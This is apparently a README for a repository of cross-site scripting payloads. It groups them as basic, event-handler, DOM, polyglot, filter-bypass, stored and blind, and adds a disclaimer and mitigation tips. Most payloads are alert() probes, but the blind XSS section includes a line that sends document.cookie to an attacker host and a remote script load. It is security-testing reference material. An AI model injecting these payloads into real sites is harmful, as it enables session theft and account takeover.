# Cross-Site Scripting (XSS) Payloads

This repository contains a comprehensive list of **Cross-Site Scripting (XSS)** payloads, categorized and designed for ethical security testing. These payloads can help identify and understand XSS vulnerabilities in web applications.

## ‚ö†Ô∏è Disclaimer

This repository is intended for **authorized security testing and educational purposes only**. Misuse of these payloads against systems without explicit permission is illegal and unethical. The repository maintainers are not liable for any misuse.

## üìÇ Categories of XSS Payloads

### 1. **Basic XSS Payloads**
These payloads test for basic XSS vulnerabilities in input fields or query parameters.

Examples:
```html
<script>alert('XSS')</script>
<img src=x onerror=alert(1)>
"><svg onload=alert('XSS')>
```

---

### 2. **Event Handler-Based Payloads**
Payloads that leverage HTML event handlers (e.g., `onload`, `onclick`) to execute scripts.

Examples:
```html
<svg onload=alert('XSS')>
<button onclick=alert('XSS')>Click Me</button>
<img src=x onerror=alert('XSS')>
```

---

### 3. **DOM-Based XSS Payloads**
DOM-based payloads target client-side scripts that manipulate the DOM.

Examples:
```html
# In URL:
http://example.com/#<script>alert('XSS')</script>

# Injected into a DOM element:
"><img src=x onerror=alert(1)>
```

---

### 4. **Polyglot XSS Payloads**
Payloads designed to work in multiple contexts (HTML, JavaScript, etc.).

Examples:
```html
"><script>alert('XSS')</script>
"><img src=x onerror=alert('XSS')>
</style><script>alert('XSS')</script>
```

---

### 5. **Bypass Techniques**
Payloads to bypass common XSS protections, such as filters or WAFs (Web Application Firewalls).

Examples:
```html
"><ScRiPt>alert('XSS')</ScRiPt>
<IMG SRC=x onerror="JaVaScRiPt:alert('XSS');">
%3Cscript%3Ealert('XSS')%3C/script%3E
```

---

### 6. **Stored XSS Payloads**
Payloads intended for stored XSS testing (e.g., in comment boxes, profiles).

Examples:
```html
<script>alert('Stored XSS')</script>
<img src=x onerror=alert('Stored XSS')>
```

---

### 7. **Blind XSS Payloads**
Payloads for blind XSS testing, useful when you don‚Äôt see immediate results.

Examples:
```html
<script src="https://example.com/malicious.js"></script>
<img src="http://attacker.com/log?cookie="+document.cookie>
```

---

## üí° Usage Guidelines

1. **Identify Input Fields**: Locate user input fields, query parameters, or form inputs where scripts may be injected.
2. **Choose Payloads**: Select appropriate payloads based on the application context.
3. **Test Responsibly**: Use only in authorized environments with explicit permission.
4. **Analyze Responses**: Observe application behavior and identify any XSS vulnerability indications.

---

## üõ†Ô∏è Mitigation Techniques

To protect against XSS vulnerabilities:
1. **Sanitize Inputs**: Use libraries to encode and sanitize user input.
2. **Content Security Policy (CSP)**: Implement a strong CSP to prevent unauthorized scripts.
3. **Output Encoding**: Encode output for the correct context (HTML, JavaScript, etc.).
4. **Avoid Dangerous APIs**: Refrain from using `eval()`, `document.write()`, or other risky methods.
5. **Use Security Libraries**: Leverage tools like DOMPurify to clean untrusted HTML inputs.
